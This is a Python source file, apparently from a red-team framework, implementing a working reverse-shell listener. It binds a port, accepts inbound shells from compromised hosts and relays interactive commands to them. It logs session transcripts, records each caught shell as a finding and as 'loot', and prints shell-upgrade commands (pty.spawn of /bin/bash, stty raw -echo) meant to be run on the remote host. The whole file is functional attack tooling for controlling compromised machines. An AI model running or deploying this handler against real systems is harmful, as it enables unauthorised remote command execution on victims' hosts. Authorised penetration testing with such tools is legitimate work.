"""Pure-python reverse-shell catcher (``payloads.listener``).

A stdlib-only TCP listener/handler that binds a local port, accepts an
incoming reverse shell, and relays the session interactively between the
operator's terminal and the remote host:

* a background **reader thread** pumps ``socket -> stdout``
* the **main thread** pumps ``stdin -> socket`` (so ``Ctrl-C`` is catchable)

The full session transcript (both directions) is written to a log file inside
the engagement workdir. On connect the module prints the usual PTY-upgrade
hints (``python3 -c 'import pty;...'`` / ``stty raw -echo``).

No external tools, no third-party libraries, no AI. Everything here is
``socket`` + ``threading`` from the standard library, so it imports and runs
identically on Windows and Linux. On Windows the ``stdin`` relay is
best-effort (blocking console reads cannot be interrupted by a peer
disconnect the way ``select`` on a POSIX pty allows), which is documented at
the point where it matters.
"""
from __future__ import annotations

import errno
import os
import socket
import sys
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

from redkit.core.module import Module, Option, Result
from redkit.core.registry import register

# Windows' WSAEADDRINUSE (10048) is not always mapped onto errno.EADDRINUSE.
_WSAEADDRINUSE = getattr(errno, "WSAEADDRINUSE", 10048)
_ADDR_IN_USE = {errno.EADDRINUSE, _WSAEADDRINUSE}

_RECV_CHUNK = 4096


@register
class ReverseShellListener(Module):
    """Catch and interactively handle a single reverse shell (or many)."""

    name = "payloads.listener"
    description = "pure-python TCP listener to catch and relay a reverse shell"
    phase = "payloads"
    options = [
        Option("lhost", default="0.0.0.0", help="local address to bind"),
        Option("lport", default=4444, help="local TCP port to listen on"),
        Option(
            "timeout",
            default=0,
            help="seconds to wait for a connection and idle-close a session "
            "(0 = wait forever, no idle timeout)",
        ),
        Option(
            "once",
            default=True,
            help="handle a single session then stop (false = keep listening)",
        ),
        Option("log", default="session.log", help="transcript log filename in workdir"),
    ]
    requires_tools = []  # pure python; nothing external required
    references = [
        "https://github.com/rapid7/metasploit-framework (multi/handler)",
        "https://gtfobins.github.io/ (pty upgrade techniques)",
    ]

    # -- entry point -------------------------------------------------------
    def run(self, opts: Dict[str, Any], ctx) -> Result:
        lhost: str = str(opts["lhost"])
        lport: int = int(opts["lport"])
        timeout: int = int(opts["timeout"])
        once: bool = bool(opts["once"])
        log_name: str = str(opts["log"]) or "session.log"

        if lport < 0 or lport > 65535:
            return Result(
                ok=False,
                summary=f"invalid port {lport} (must be 0-65535)",
                data={"lhost": lhost, "lport": lport},
            )
        if timeout < 0:
            timeout = 0

        base: Dict[str, Any] = {
            "lhost": lhost,
            "lport": lport,
            "timeout": timeout,
            "once": once,
        }

        # Respect the global --dry-run flag: describe intent, never bind.
        if getattr(ctx.runner, "dry_run", False):
            ctx.console.info(f"(dry-run) would listen on {lhost}:{lport} (once={once})")
            return Result(
                ok=True,
                summary=f"dry-run: would listen on {lhost}:{lport}",
                data=base,
            )

        # -- bind / listen -------------------------------------------------
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # SO_REUSEADDR on POSIX lets us re-bind a port in TIME_WAIT. On Windows
        # it has hijack semantics and would mask an "address in use" error, so
        # we deliberately skip it there to keep the in-use check meaningful.
        if os.name != "nt":
            try:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except OSError:
                pass

        try:
            srv.bind((lhost, lport))
        except OverflowError:
            srv.close()
            return Result(ok=False, summary=f"invalid port {lport}", data=base)
        except OSError as exc:
            srv.close()
            if exc.errno in _ADDR_IN_USE:
                return Result(
                    ok=False,
                    summary=f"port {lport} is already in use on {lhost}",
                    data={**base, "error": "address_in_use"},
                )
            return Result(
                ok=False,
                summary=f"cannot bind {lhost}:{lport}: {exc}",
                data={**base, "error": str(exc)},
            )

        try:
            srv.listen(1 if once else 8)
        except OSError as exc:
            srv.close()
            return Result(ok=False, summary=f"listen failed: {exc}", data=base)

        ctx.console.good(f"listening on {lhost}:{lport} (once={once})")
        if timeout > 0:
            ctx.console.info(f"connection/idle timeout: {timeout}s")
        else:
            ctx.console.info("blocking until a connection arrives (Ctrl-C to abort)")

        log_path = ctx.artifact_path(log_name)
        sessions: List[Dict[str, Any]] = []
        total_in = 0
        total_out = 0
        interrupted = False
        log_fh = None
        try:
            try:
                log_fh = open(log_path, "ab")
            except OSError as exc:
                ctx.console.warn(f"cannot open transcript log {log_path}: {exc}")
                log_fh = None
            log_lock = threading.Lock()

            while True:
                srv.settimeout(timeout if timeout > 0 else None)
                try:
                    conn, peer = srv.accept()
                except socket.timeout:
                    if not sessions:
                        ctx.console.warn(f"no connection within {timeout}s")
                    break
                except KeyboardInterrupt:
                    interrupted = True
                    ctx.console.warn("interrupted while waiting for a connection")
                    break
                except OSError as exc:
                    ctx.console.bad(f"accept failed: {exc}")
                    break

                peer_ip, peer_port = self._peer_parts(peer)
                ctx.console.good(f"connection from {peer_ip}:{peer_port}")
                conn.settimeout(timeout if timeout > 0 else None)

                counters, ki = self._relay(conn, peer, log_fh, log_lock, ctx)
                total_in += counters["in"]
                total_out += counters["out"]
                sessions.append(
                    {
                        "ip": peer_ip,
                        "port": peer_port,
                        "bytes_in": counters["in"],
                        "bytes_out": counters["out"],
                    }
                )
                self._persist(ctx, peer_ip, peer_port, lport, counters, log_path)

                if ki:
                    interrupted = True
                    break
                if once:
                    break
        except KeyboardInterrupt:
            interrupted = True
            ctx.console.warn("interrupted")
        finally:
            if log_fh is not None:
                try:
                    log_fh.flush()
                    log_fh.close()
                except OSError:
                    pass
            try:
                srv.close()
            except OSError:
                pass

        # -- summarize -----------------------------------------------------
        data: Dict[str, Any] = {
            **base,
            "sessions": sessions,
            "session_count": len(sessions),
            "bytes_in": total_in,
            "bytes_out": total_out,
            "bytes_total": total_in + total_out,
            "transcript": str(log_path),
            "interrupted": interrupted,
        }
        if sessions:
            last = sessions[-1]
            data["peer"] = {"ip": last["ip"], "port": last["port"]}

        artifacts = [str(log_path)] if (log_fh is not None or log_path.exists()) else []
        if not sessions:
            return Result(
                ok=False,
                summary="no reverse-shell connection was caught",
                data=data,
                artifacts=artifacts,
            )
        return Result(
            ok=True,
            summary=(
                f"handled {len(sessions)} session(s) on {lhost}:{lport}; "
                f"{total_in + total_out} bytes relayed"
            ),
            data=data,
            artifacts=artifacts,
        )

    # -- session relay -----------------------------------------------------
    def _relay(
        self,
        conn: socket.socket,
        peer: Tuple[Any, ...],
        log_fh,
        log_lock: threading.Lock,
        ctx,
    ) -> Tuple[Dict[str, int], bool]:
        """Relay one interactive session. Returns (byte counts, ctrl_c?)."""
        stop = threading.Event()
        counters = {"in": 0, "out": 0}
        peer_ip, peer_port = self._peer_parts(peer)

        if log_fh is not None:
            stamp = time.strftime("%Y-%m-%d %H:%M:%S")
            with log_lock:
                try:
                    log_fh.write(
                        f"\n===== session {peer_ip}:{peer_port} @ {stamp} =====\n".encode()
                    )
                    log_fh.flush()
                except OSError:
                    pass

        def reader() -> None:
            """socket -> stdout + transcript. Ends the session on EOF/idle."""
            try:
                while not stop.is_set():
                    try:
                        data = conn.recv(_RECV_CHUNK)
                    except socket.timeout:
                        # idle timeout elapsed with no inbound data -> drop
                        break
                    except OSError:
                        break
                    if not data:
                        break  # peer closed the connection
                    counters["in"] += len(data)
                    self._write_stdout(data)
                    if log_fh is not None:
                        with log_lock:
                            try:
                                log_fh.write(data)
                                log_fh.flush()
                            except OSError:
                                pass
            finally:
                stop.set()

        t = threading.Thread(target=reader, name="redkit-listener-reader", daemon=True)
        t.start()

        self._print_pty_hints(ctx)
        ctx.console.info(
            "interactive: type commands + Enter. Ctrl-C drops the session; "
            "if the peer disconnects first, press Enter to return."
        )

        ctrl_c = False
        stdin_buf = getattr(sys.stdin, "buffer", None)
        try:
            while not stop.is_set():
                line = self._read_stdin_line(stdin_buf)
                if line is None or line == b"":
                    # Local stdin EOF (Ctrl-D / Ctrl-Z+Enter / piped input): stop
                    # sending, but half-close only our write side so the remote
                    # shell sees EOF while we keep relaying its remaining output.
                    try:
                        conn.shutdown(socket.SHUT_WR)
                    except OSError:
                        pass
                    break
                if stop.is_set():
                    break
                # normalize CRLF (Windows console) so remote shells see LF
                line = line.replace(b"\r\n", b"\n")
                try:
                    conn.sendall(line)
                except OSError:
                    break
                counters["out"] += len(line)
                if log_fh is not None:
                    with log_lock:
                        try:
                            log_fh.write(line)
                            log_fh.flush()
                        except OSError:
                            pass
            # Keep draining inbound until the reader thread finishes (peer close
            # or idle timeout). Poll so Ctrl-C stays responsive during the wait.
            while not stop.wait(0.2):
                pass
        except KeyboardInterrupt:
            ctrl_c = True
            ctx.console.warn("Ctrl-C - dropping session")
        finally:
            stop.set()
            try:
                conn.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                conn.close()
            except OSError:
                pass
            t.join(timeout=2.0)

        ctx.console.info(
            f"session closed ({peer_ip}:{peer_port}) - "
            f"in={counters['in']}B out={counters['out']}B"
        )
        return counters, ctrl_c

    # -- helpers -----------------------------------------------------------
    @staticmethod
    def _peer_parts(peer: Tuple[Any, ...]) -> Tuple[str, int]:
        try:
            return str(peer[0]), int(peer[1])
        except (IndexError, TypeError, ValueError):
            return str(peer), 0

    @staticmethod
    def _read_stdin_line(stdin_buf) -> Optional[bytes]:
        """Blocking best-effort read of one line from stdin as bytes."""
        try:
            if stdin_buf is not None:
                return stdin_buf.readline()
            text = sys.stdin.readline()
            return text.encode("utf-8", "replace") if text else b""
        except KeyboardInterrupt:
            raise
        except Exception:
            return None

    @staticmethod
    def _write_stdout(data: bytes) -> None:
        """Write raw bytes to stdout, tolerating encoding/stream quirks."""
        out = getattr(sys.stdout, "buffer", None)
        try:
            if out is not None:
                out.write(data)
                out.flush()
            else:
                sys.stdout.write(data.decode("utf-8", "replace"))
                sys.stdout.flush()
        except Exception:
            pass

    @staticmethod
    def _print_pty_hints(ctx) -> None:
        ctx.console.raw("")
        ctx.console.info("PTY upgrade hints (run in the caught shell, then locally):")
        ctx.console.raw("  remote: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        ctx.console.raw("  remote: (or) script -qc /bin/bash /dev/null")
        ctx.console.raw("  local : Ctrl-Z, then  stty raw -echo; fg  (Enter twice)")
        ctx.console.raw("  remote: export TERM=xterm; stty rows 40 columns 120")
        ctx.console.raw("")

    def _persist(
        self,
        ctx,
        peer_ip: str,
        peer_port: int,
        lport: int,
        counters: Dict[str, int],
        log_path,
    ) -> None:
        """Record the caught shell in shared engagement state."""
        try:
            eng = ctx.engagement
            eng.add_host(peer_ip)
            eng.add_note(
                f"caught reverse shell from {peer_ip}:{peer_port} on local port "
                f"{lport} (in={counters['in']}B out={counters['out']}B)"
            )
            eng.add_finding(
                title="Reverse shell session caught",
                severity="high",
                host=peer_ip,
                description=(
                    f"An inbound reverse shell from {peer_ip} was received and "
                    f"handled on local port {lport}; interactive command "
                    f"execution on the remote host was demonstrated."
                ),
                evidence=str(log_path),
            )
            eng.add_loot(
                host=peer_ip,
                kind="reverse-shell-transcript",
                value=str(log_path),
                source="payloads.listener",
            )
        except Exception as exc:  # never let bookkeeping crash the module
            ctx.console.debug(f"engagement persist failed: {exc}")
